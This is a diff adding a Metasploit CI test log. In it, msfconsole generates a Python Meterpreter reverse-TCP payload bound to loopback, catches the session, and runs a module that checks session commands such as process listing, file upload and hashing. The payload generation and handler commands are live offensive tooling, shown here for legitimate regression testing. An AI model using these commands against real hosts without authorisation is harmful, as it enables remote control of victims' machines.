@@ -1,0 +1,77 @@
+use python/meterpreter_reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-2208-1xtb42c.py -f raw MeterpreterTryToFork=false lport=6005 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 115725 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-2208-1xtb42c.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 4
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6005 
+[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:50021 ) at 2022-01-19 11:01:57 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=5 addentropy=true verbose=true
+
+[*] Setup: changing working directory to C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Running against session 5
+[*] Session type is meterpreter and platform is windows
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting process tests
+[*] Pid: 3880
+[+] should return its own process id
+[*] PID info: {"pid"=>3880, "ppid"=>2208, "name"=>"python.exe", "path"=>"C:\\msys64\\mingw64\\bin\\python.exe", "session"=>nil, "user"=>"fv-az159-261\\runneradmin", "arch"=>"x64"}
+[+] should return a list of processes
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[-] FAILED: should return the proper directory separator
+[*] CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] Current directory: "C:/Users/RUNNER~1/AppData/Local/Temp"
+[*] Stat of current directory: #<#<Class:0x0000020ef88421b0>:0x0000020ef87abfa8 @stathash={"st_dev"=>1518564515, "st_mode"=>16895, "st_nlink"=>1, "st_uid"=>0, "st_gid"=>0, "st_rdev"=>1518564515, "st_ino"=>1407374883584448, "st_size"=>4096, "st_atime"=>1642590114, "st_mtime"=>1642590114, "st_ctime"=>1642578751}>
+[+] should stat a directory
+[*] Directory Name: meterpreter-test-dir-mejthvug
+[*] Directory created successfully
+[*] Directory removed successfully
+[+] should create and remove a dir
+[*] Directory Name: meterpreter-test-dir-mejthvug
+[*] Directory created successfully
+[*] Old CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[*] New CWD: C:/Users/RUNNER~1/AppData/Local/Temp/meterpreter-test-dir-mejthvug
+[*] Back to old CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[*] Directory removed successfully
+[+] should change directories
+[*] File Name: meterpreter-test-mejthvug
+[*] Wrote to meterpreter-test-mejthvug, checking contents
+[*] Wrote test
+[+] should create and remove files
+[*] Remote File Name: meterpreter-test-file-mejthvug.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[-] FAILED: should upload a file
+[*] Source File Name: meterpreter-test-mejthvug
+[*] Destination File Name: meterpreter-test-mejthvug-moved
+[+] should move files
+[*] Source File Name: meterpreter-test-mejthvug
+[*] Destination File Name: meterpreter-test-mejthvug-copied
+[+] should copy files
+[*] Remote File Name: meterpreter-test-file-mejthvug.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[*] remote md5: 781830d7e85894e2bf2cfbd0fe78e6e6
+[*] local md5 : 238bab901e240f3e78ad6f290bca0510
+[*] remote sha: 6393a6e292f338fca91c7127297da8024274df52
+[*] local sha : ea186228a55278d32516182f230181dccf4b7934
+[-] FAILED: should do md5 and sha1 of files
+[*] Testing complete in 1.4140623
+[-] Passed: 17; Failed: 3
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
